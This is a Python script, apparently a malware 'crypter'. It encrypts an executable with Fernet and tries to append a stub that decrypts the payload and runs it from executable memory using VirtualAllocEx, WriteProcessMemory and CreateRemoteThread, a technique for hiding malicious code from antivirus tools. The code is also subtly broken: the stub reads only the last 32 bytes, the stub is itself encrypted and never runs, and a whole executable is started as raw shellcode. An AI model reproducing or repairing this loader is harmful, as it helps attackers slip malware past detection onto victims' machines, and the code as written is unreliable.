import io
import ctypes
from cryptography.fernet import Fernet

# Define the encryption key
key = b"<INSERT KEY HERE>"

# Define the path to the software to be encrypted
software_path = "software.exe"

# Define the path to the encrypted software
encrypted_path = "encrypted_software.exe"

def decrypt_and_execute():
    # Load the encrypted software into memory
    encrypted_data = None

    with open(encrypted_path, "rb") as f:
        encrypted_data = f.read()

    # Decrypt the software in memory
    cipher = Fernet(key)
    decrypted_data = cipher.decrypt(encrypted_data)

    # Load the decrypted software into memory and execute it
    kernel32 = ctypes.windll.kernel32
    process_handle = kernel32.GetCurrentProcess()
    mem = kernel32.VirtualAllocEx(process_handle, None, len(decrypted_data), 0x3000, 0x40)
    kernel32.WriteProcessMemory(process_handle, mem, decrypted_data, len(decrypted_data), None)
    thread_id = ctypes.c_ulong(0)
    kernel32.CreateRemoteThread(process_handle, None, 0, mem, None, 0, ctypes.byref(thread_id))

# Encrypt the software and add the decryption code
with open(software_path, "rb") as f:
    data = f.read()

cipher = Fernet(key)
encrypted_data = cipher.encrypt(data)

decrypt_code = io.StringIO()
decrypt_code.write("from cryptography.fernet import Fernet\n")
decrypt_code.write("key = b'" + key.decode('utf-8') + "'\n")
decrypt_code.write("cipher = Fernet(key)\n")
decrypt_code.write("encrypted_data = None\n")
decrypt_code.write("with open(__file__, 'rb') as f:\n")
decrypt_code.write("    f.seek(-32, 2)\n")
decrypt_code.write("    encrypted_data = f.read()\n")
decrypt_code.write("decrypted_data = cipher.decrypt(encrypted_data)\n")
decrypt_code.write("kernel32 = ctypes.windll.kernel32\n")
decrypt_code.write("process_handle = kernel32.GetCurrentProcess()\n")
decrypt_code.write("mem = kernel32.VirtualAllocEx(process_handle, None, len(decrypted_data), 0x3000, 0x40)\n")
decrypt_code.write("kernel32.WriteProcessMemory(process_handle, mem, decrypted_data, len(decrypted_data), None)\n")
decrypt_code.write("thread_id = ctypes.c_ulong(0)\n")
decrypt_code.write("kernel32.CreateRemoteThread(process_handle, None, 0, mem, None, 0, ctypes.byref(thread_id))\n")

encrypted_data += cipher.encrypt(decrypt_code.getvalue().encode('utf-8'))

with open(encrypted_path, "wb") as f:
    f.write(encrypted_data)

# Execute the decryption and execution code when the user runs the encrypted software
decrypt_and_execute()
